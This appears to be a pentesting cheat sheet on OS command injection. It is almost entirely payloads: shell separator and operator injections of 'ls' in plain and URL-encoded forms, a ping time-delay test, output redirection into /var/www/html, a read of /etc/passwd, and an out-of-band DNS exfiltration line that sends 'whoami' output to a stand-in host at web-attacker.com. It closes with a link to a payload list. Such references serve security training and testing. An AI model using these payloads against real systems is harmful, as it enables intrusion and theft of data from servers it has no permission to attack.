## OS command injection, simple case

Normal Command 

```bash
|ls
||ls
|ls|
||ls||
&ls
&&ls
&ls&
&&ls&&
;ls
;ls;
`ls`
$(ls)
```

With URL Encoding 

```bash
%7cls            # |ls
%7c%7cls         # ||ls
%7cls%7c         # |ls|
%7c%7cls%7c%7c   # ||ls||  
%26ls            # &ls
%26%26ls         # &&ls
%26ls%26         # &ls&
%26%26ls%26%26   # &&ls&&
%3bls            # ;ls
%3bls%3b         # ;ls;
%60ls%60         # `ls`
%0Als            # \nls
%24%28ls%29      # $(ls)
```

## Blind OS command injection with time delays

You can use an injected command that will trigger a time delay

```bash
& ping -c 10 127.0.0.1 &
```

###### Exploiting blind OS command injection using redirecting output

You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser

Try to redirect the output to a file

```bash
> /var/www/html/out.txt
```

Try to send some input to the command

```bash
< /etc/passwd
```

### Blind OS command injection with out-of-band interaction

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. 

For example:

You can use burp collaborator

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

###### Exploiting blind OS command injection using out-of-band (OAST) techniques

 The out-of-band channel also provides an easy way to exfiltrate the output from injected commands: 

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

# command injection Cheat Sheet

[command-injection-payload-list 🎯(github.com)](https://github.com/payloadbox/command-injection-payload-list)
